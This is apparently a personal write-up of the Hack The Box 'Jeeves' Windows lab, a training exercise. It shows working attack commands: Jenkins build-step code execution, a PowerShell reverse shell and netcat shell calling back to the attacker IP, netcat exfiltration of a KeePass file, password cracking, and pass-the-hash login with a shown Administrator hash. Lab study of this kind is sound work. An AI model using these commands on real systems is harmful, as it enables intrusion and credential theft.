#medium 

## 0. **Lab infos**

**Difficulty :** Medium
**Name :** Jeeves
**IP** : 10.129.228.112
**Objectives :** Get user and root flags
**OS :** #Windows

##### **Conclusion**
**Time :** 3h39
	**Start :** 22.04.2025 16:31
	**Break at/to :** 22.04.2025 19:02 | 23.04.2025 17:00
	**Finish :** 23.04.2025 18:08
**Satisfaction :**  7/10 Because for the first flag it was easy but for the escalation privilege it was more complicated so I have to use the writeup.
### 1. **Reconnaissance

We start with an #nmap scan

```BASH
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

And we make a #gobuster scan on the port 50000 because it's the only we can see without the -p-

```BASH
┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-0k04etkbc3]─[~]
└──╼ [★]$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.228.112:50000
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.112:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
Progress: 108476 / 220561 (49.18%)
```

![[Pasted image 20250422164215.png]]


## 2. **Weaponization

## 3. **Delivery

## 4. **Exploitation

We can create a new jobs and in the build > Add Build step select Execute Windows batch command.

And we can enter our command. I wrote whoami.
Adn after build the jobs we can click on Conole OutPut and see the result of our command.

![[Pasted image 20250422165715.png]]

So with this reverse shell we can have an #RCE 

```POWERSHELL
powershell -nop -c "& { $client = New-Object Net.Sockets.TCPClient('10.10.14.117',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
```

The server is extremely slow but it's okkey

![[Pasted image 20250422172207.png]]

After 1h30 without extracting the CEH.kdbx file I found that I have to make some changes.

First

```BASH
nc -nvlp 1234
```

After

Download nc.exe on my machine and place me in the directory and start a http python server.

End

```POWERSEHLL
powershell wget "http://10.10.14.117:8000/nc.exe" -outfile "nc.exe"
nc.exe -e cmd.exe 10.10.14.117 1234
```

And it's good.


For extracting the file :

Attacker :
```BASH
nc -l -p 12345 > file.kdbx
```

Victim :
```POWERSHELL
nc.exe 10.10.14.117 12345 < C:\Users\kohsuke\Documents\CEH.kdbx
```

And now we have the .kdbx file.

Now we want to crack the file so we start with 

```BASH
keepass2john file.kdbx > unfile.hash
```

```BASH
┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-yfwujbxq4p]─[~]
└──╼ [★]$ john --wordlist=/home/bobinette/Desktop/rockyou.txt unfile.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (file)     
1g 0:00:00:11 DONE (2025-04-23 10:24) 0.08403g/s 4619p/s 4619c/s 4619C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the password is moonshine1

So first, you need to download keepassxc :

```BASH
sudo apt install keepassxc
```

And after you can run this and enter the password :

```BASH
keepassxc open file.kdbx
```

![[Pasted image 20250423173252.png]]

![[Pasted image 20250423173816.png]]

Now we can correctly connect to the machin as Administrator with : 

```BASH
python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.129.228.112
```

## 5. **Installation

## 6. **Command and Control

## 7. **Actions on Objectives

So for the first flag it's in kohsuke on his desktop :

```POWERSHELL
> type kohsuke\Desktop\user.txt
e3232272596fb47950d59c4cf1e7066a
```


Now for the root flag :

```POWERSHELL
C:\Windows\system32>type C:\Users\Administrator\Desktop\hm.txt
The flag is elsewhere.  Look deeper.

C:\Windows\system32>type C:\Users\Administrator\Desktop\"Windows 10 Update Assistant".lnk
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
L�F� �<VU��<VU��E���ȚP�O� �:i�+00�/C:\j1eKw4WINDOW~1R	�dK8eKw4.�q�&Windows10Upgrade~2Ț�JOo WINDOW~1.EXEb	�dK9dK9.��Windows10UpgraderApp.exe[-ZɱP�C:\Windows10Upgrade\Windows10UpgraderApp.exe2..\..\..\Windows10Upgrade\Windows10UpgraderApp.exe&/ClientID "Win10Upgrade:VNL:Th2Eos:{}"`�XjeevesĘ�R+�$H�||�� �
                                                                     U�������
                                                                             )E�.Ę�R+�$H�||�� �
                                                                                               U�������
                                                                                                       )E�.E	�91SPS�mD��pH�H@.�=x�hH�R;W�0@��U@�S|�
```

We are going to look deeper.

```POWERSHELL
C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,680,635,392 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\hm.txt:root.txt
The filename, directory name, or volume label syntax is incorrect.

C:\Windows\system32>more < C:\Users\Administrator\Desktop\hm.txt:root.txt
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
┌─[eu-dedivip-1]─[10.10.14.117]─[bobinette@htb-yfwujbxq4p]─[~/Desktop/netcat-1.11/impacket]
└──╼ [★]$ python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.129.8.255
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,680,582,144 bytes free

C:\Windows\system32>powershell -command "Get-Content -path 'C:\Users\Administrator\Desktop\hm.txt:root.txt'"
afbc5bd4b615a60648cec41c6ac92530
```